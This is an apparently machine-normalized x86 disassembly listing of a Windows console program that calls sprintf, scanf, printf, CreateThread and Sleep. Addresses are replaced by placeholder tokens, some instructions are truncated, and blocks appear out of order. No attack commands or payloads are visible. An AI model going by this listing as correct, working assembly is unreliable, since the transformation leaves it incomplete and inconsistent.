mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov ebx ebp
imul ebp eax
sub ebx ebp
jmp r-xdata
mov eax [ esp + 0x1f4fc ]
mov ebx [ esp + 0x1f4f4 ]
lea ecx [ eax + 0x1 ]
imul ecx ebp
cmp ecx ebx
jl r-xdata
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
call [ rand@IAT ]
mov edi eax
lea edx [ esp + 0x4a ]
push edi
push rw-data
push edx
call esi
push edi
call sub_4023f0
mov ecx 0x7d00
xor eax eax
lea edi [ esp + 0x82 ]
push ebx
[ edi ]
mov ecx [ esp + 0x1f51c ]
lea eax [ esp + 0x86 ]
push eax
push ecx
call sub_4024c0
mov edx [ esp + 0x1f52c ]
lea eax [ esp + 0x34 ]
push edx
push eax
call sub_403360
add esp 0x2c
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1f4dc
retn
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_4035d0
sub esp 0x450
push ebx
push ebp
push esi
lea eax [ esp + 0x1c ]
push edi
push eax
call [ GetLocalTime@IAT ]
xor ebx ebx
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x61 ]
mov [ esp + 0x60 ] bl
mov [ esp + 0x30 ] bl
[ edi ]
xor ecx ecx
mov edx [ esp + 0x2c ]
mov [ esp + 0x11 ] ecx
and edx 0xffff
mov [ esp + 0x15 ] ecx
push edx
stosw [ edi ]
mov [ esp + 0x1d ] ecx
mov edx [ esp + 0x2a ]
mov [ esp + 0x21 ] cx
and edx 0xffff
stosb [ edi ]
mov [ esp + 0x23 ] cl
mov ecx 0xb
xor eax eax
lea edi [ esp + 0x35 ]
[ edi ]
mov ecx [ esp + 0x2c ]
mov [ esp + 0x14 ] bl
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x2e ]
and ecx 0xffff
and eax 0xffff
mov edi [ sprintf@IAT ]
push eax
mov eax [ esp + 0x2a ]
push ecx
mov ecx [ esp + 0x2c ]
and eax 0xffff
push edx
and ecx 0xffff
push eax
push ecx
lea edx [ esp + 0x48 ]
push rw-data
push edx
call edi
push rw-data
lea eax [ esp + 0x84 ]
push rw-data
push eax
call edi
mov esi [ esp + 0x490 ]
lea ecx [ esp + 0x8c ]
push esi
push ecx
call sub_403800
add esp 0x34
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x450
retn
mov ebp [ Sleep@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x450
retn
mov eax [ rw-data ]
cmp eax 0x5
jge r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x30 ]
push rw-data
lea edx [ esp + 0x34 ]
push ecx
push edx
push rw-data
push rw-data
push rw-data
push eax
lea ecx [ esp + 0x7c ]
push rw-data
push ecx
mov [ rw-data ] ebx
call edi
lea edx [ esp + 0x84 ]
push esi
push edx
call sub_403800
add esp 0x2c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
inc eax
imul ecx eax
push ecx
mov [ rw-data ] eax
call ebp
push rw-data
lea edx [ esp + 0x64 ]
push rw-data
push edx
call edi
lea eax [ esp + 0x6c ]
push esi
push eax
call sub_403800
add esp 0x14
test eax eax
jne r-xdata
push rw-data
lea eax [ esp + 0x64 ]
push rw-data
push eax
call edi
lea ecx [ esp + 0x6c ]
push esi
push ecx
call sub_403800
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x450
retn
lea edx [ esp + 0x10 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x450
retn
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x450
retn
sub_403800
push ebp
mov ebp esp
push 0xffffffff
push sub_4055b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x82c
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov ecx 0x1ff
xor eax eax
lea edi [ ebp - 0x837 ]
mov [ ebp - 0x838 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x23 ] eax
push ecx
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] ax
mov [ ebp - 0x11 ] al
call sub_4021e0
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push edx
push rw-data
push eax
push rw-data
lea ecx [ ebp - 0x838 ]
push rw-data
push ecx
call [ sprintf@IAT ]
mov ecx 0x1f400
xor eax eax
mov edi ebx
push 0x1
lea edx [ ebp - 0x838 ]
push ebx
[ edi ]
push edx
call sub_403b30
add esp 0x28
mov [ rw-data ] eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push rw-data
push ebx
call sub_402230
add esp 0x10
test eax eax
je r-xdata
mov esi rw-data
lea eax [ ebp - 0x38 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_4039b0
add esp 0x4
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_403960
push rw-data
push rw-data
push rw-data
push rw-data
call sub_401cd0
push rw-data
call sub_401da0
push rw-data
call sub_4021e0
or eax 0xffffffff
add esp 0x18
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax 0x1
retn
sub_4039b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4055c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x218
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x7f
xor eax eax
lea edi [ ebp - 0x223 ]
mov [ ebp - 0x224 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ ebp - 0x23 ] eax
or ecx 0xffffffff
mov [ ebp - 0x1f ] eax
lea edx [ ebp - 0x224 ]
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13 ] ax
mov [ ebp - 0x24 ] bl
[ edi ]
not ecx
sub edi ecx
mov [ ebp - 0x11 ] al
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x224 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x24 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_4021e0
lea edi [ ebp - 0x24 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x224 ]
[ edi ]
not ecx
sub edi ecx
push 0x1
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
mov ecx 0x1f400
mov edi esi
[ edi ]
lea eax [ ebp - 0x224 ]
push esi
push eax
call sub_403b30
add esp 0x10
cmp eax ebx
mov [ rw-data ] eax
jle r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push rw-data
push rw-data
push esi
call sub_402230
add esp 0x10
test eax eax
je r-xdata
push rw-data
push rw-data
push rw-data
push esi
call sub_402230
add esp 0x10
neg eax
sbb eax eax
neg eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403b30
push ebp
mov ebp esp
push 0xffffffff
push sub_4055d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x804
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x1ff
xor eax eax
lea edi [ ebp - 0x80f ]
mov [ ebp - 0x810 ] bl
[ edi ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
stosw [ edi ]
push ebx
push ebx
stosb [ edi ]
mov al [ ebp + 0x10 ]
push ecx
mov ecx rw-data
mov [ ebp - 0x4 ] ebx
mov [ rw-data ] al
call sub_401450
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx rw-data
call sub_401bd0
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x810 ]
push 0x800
push edx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x1
jbe r-xdata
lea eax [ ebx + ecx ]
cmp eax 0x20000
jge r-xdata
mov ecx rw-data
mov [ ebp - 0x4 ] 0xffffffff
call sub_401ca0
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov edi rw-data
or ecx 0xffffffff
mov [ edx ] al
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov ebx ecx
dec ebx
mov edx [ ebp + 0xc ]
lea esi [ ebp - 0x810 ]
push 0x800
lea edi [ ebx + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov ebx eax
and ecx 0x3
lea eax [ ebp - 0x810 ]
[ edi ] [ esi ]
push eax
jmp r-xdata
mov ecx rw-data
call sub_401b90
mov ecx eax
test ecx ecx
je r-xdata
sub_403c80
sub esp 0x400
push ebx
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov ebx [ esp + 0x414 ]
[ edi ]
stosw [ edi ]
test ebx ebx
stosb [ edi ]
je r-xdata
lea edx [ esp + 0xc ]
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x8
mov eax [ esp + 0x410 ]
lea ecx [ esp + 0xc ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x400
retn
mov esi [ esp + 0x418 ]
lea eax [ esp + 0xc ]
push esi
push eax
call sub_403800
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x400
retn
mov edi [ printf@IAT ]
test ebx ebx
je r-xdata
lea eax [ esp + 0xc ]
push eax
push rw-data
lea edx [ esp + 0xc ]
push edx
push rw-data
jmp r-xdata
test ebx ebx
je r-xdata
call edi
add esp 0x8
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esp + 0xc ]
push eax
push rw-data
lea edx [ esp + 0xc ]
push edx
push rw-data
jmp r-xdata
test ebx ebx
je r-xdata
call edi
add esp 0x8
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esp + 0xc ]
push eax
push rw-data
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
push rw-data
call edi
add esp 0x8
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call edi
add esp 0x8
lea eax [ esp + 0xc ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea edx [ esp + 0xc ]
push edx
push rw-data
test ebx ebx
je r-xdata
lea edx [ esp + 0xc ]
push edx
push rw-data
lea ecx [ esp + 0xc ]
push ecx
push rw-data
jmp r-xdata
test ebx ebx
je r-xdata
call edi
add esp 0x8
lea eax [ esp + 0xc ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea edx [ esp + 0xc ]
push edx
push rw-data
call edi
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call edi
add esp 0x8
lea eax [ esp + 0xc ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call edi
lea edx [ esp + 0x14 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x18
test esi esi
je r-xdata
lea eax [ esp + 0xc ]
push eax
push rw-data
call edi
add esp 0x8
jmp r-xdata
sub_403f00
sub esp 0x400
push ebx
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x410 ]
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esp + 0xc ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov edx [ esp + 0x414 ]
lea eax [ esp + 0xc ]
push edx
push eax
call sub_403800
add esp 0x8
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
add esp 0x400
retn
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_403fb0
sub esp 0x400
push ebx
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x410 ]
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esp + 0xc ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov edx [ esp + 0x414 ]
lea eax [ esp + 0xc ]
push edx
push eax
call sub_403800
add esp 0x8
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
add esp 0x400
retn
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_404060
sub esp 0x400
push ebx
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x410 ]
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esp + 0xc ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov edx [ esp + 0x414 ]
lea eax [ esp + 0xc ]
push edx
push eax
call sub_403800
add esp 0x8
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
add esp 0x400
retn
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_404110
sub esp 0x400
push ebp
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov ebp [ esp + 0x414 ]
[ edi ]
stosw [ edi ]
test ebp ebp
stosb [ edi ]
je r-xdata
lea edx [ esp + 0xc ]
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x8
mov eax [ esp + 0x410 ]
lea ecx [ esp + 0xc ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
test esi esi
push ebx
je r-xdata
pop edi
pop esi
pop ebp
add esp 0x400
retn
mov esi [ esp + 0x418 ]
mov ecx 0x1f400
xor eax eax
mov edi esi
[ edi ]
lea eax [ esp + 0xc ]
push esi
push eax
call sub_403800
add esp 0x8
test eax eax
jne r-xdata
pop ebx
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x400
retn
mov edi [ printf@IAT ]
mov ebx [ atoi@IAT ]
test ebp ebp
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
lea edx [ esp + 0x10 ]
push edx
push rw-data
jmp r-xdata
test ebp ebp
je r-xdata
call edi
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
lea edx [ esp + 0x10 ]
push edx
push rw-data
jmp r-xdata
test ebp ebp
je r-xdata
call edi
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
lea edx [ esp + 0x10 ]
push edx
push rw-data
jmp r-xdata
test ebp ebp
je r-xdata
call edi
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
jmp r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
call edi
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call edi
add esp 0x8
lea edx [ esp + 0x10 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
call edi
lea eax [ esp + 0x18 ]
push eax
call ebx
push eax
call sub_4023f0
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x20
test esi esi
je r-xdata
test ebp ebp
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
call edi
lea eax [ esp + 0x18 ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x18
test esi esi
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
lea eax [ esp + 0x10 ]
push eax
push rw-data
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
test ebp ebp
je r-xdata
call edi
add esp 0x8
lea edx [ esp + 0x10 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call edi
add esp 0x8
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
call edi
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
sub_4043f0
sub esp 0x400
push ebx
push ebp
push esi
push edi
xor ebp ebp
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x414 ]
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x8
push edi
lea eax [ esp + 0x14 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
mov ebp 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
cmp ebp 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn
mov esi [ esp + 0x418 ]
mov ecx 0x1f400
xor eax eax
mov edi esi
lea edx [ esp + 0x10 ]
push esi
[ edi ]
push edx
call sub_403800
add esp 0x8
test eax eax
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x400
retn
mov edi [ printf@IAT ]
mov edi [ printf@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call edi
lea edx [ esp + 0x18 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x18
test esi esi
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call edi
lea edx [ esp + 0x18 ]
push edx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x18
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
call edi
add esp 0x8
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
call edi
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x18
test esi esi
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
call edi
add esp 0x8
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
mov esi eax
add esp 0x10
test esi esi
je r-xdata
sub_4045d0
mov eax 0x1f55c
call sub_4053b0
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] bl
[ edi ]
stosw [ edi ]
push rw-data
stosb [ edi ]
call [ printf@IAT ]
mov eax [ _iob@IAT ]
push eax
call [ fflush@IAT ]
push rw-data
push rw-data
call [ scanf@IAT ]
add esp 0x10
mov esi rw-data
mov eax rw-data
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov eax 0x1
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
add esp 0x1f55c
retn
push ebx
push ebx
push ebx
push sub_405240
push ebx
push ebx
call [ CreateThread@IAT ]
push eax
call [ CloseHandle@IAT ]
cmp [ rw-data ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push ebp
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ _iob@IAT ]
push eax
call [ fflush@IAT ]
mov ecx 0x40
xor eax eax
mov edi rw-data
push rw-data
[ edi ]
push rw-data
call [ scanf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x14
mov edi rw-data
[ edi ]
call sub_4026e0
mov esi eax
mov eax [ rw-data ]
add esp 0x14
cmp eax ebx
je r-xdata
push rw-data
call [ printf@IAT ]
add esp 0x4
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp esi ebx
mov [ rw-data ] 0x1
jle r-xdata
push 0x64
call [ Sleep@IAT ]
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov ebp [ rw-data ]
mov esi rw-data
mov eax ebp
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
jne r-xdata
pop ebp
mov eax 0x1
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
add esp 0x1f55c
retn
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov edx [ esp + 0x1f570 ]
push edx
push ebx
push rw-data
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx [ esp + 0x1f570 ]
push ecx
push ebx
push rw-data
call sub_404110
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
add esp 0xc
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ esp + 0x1f570 ]
push eax
push rw-data
call sub_4043f0
add esp 0x8
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push rw-data
call [ printf@IAT ]
add esp 0x4
jmp r-xdata
mov edx [ esp + 0x1f570 ]
push edx
push eax
call sub_403f00
add esp 0x8
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
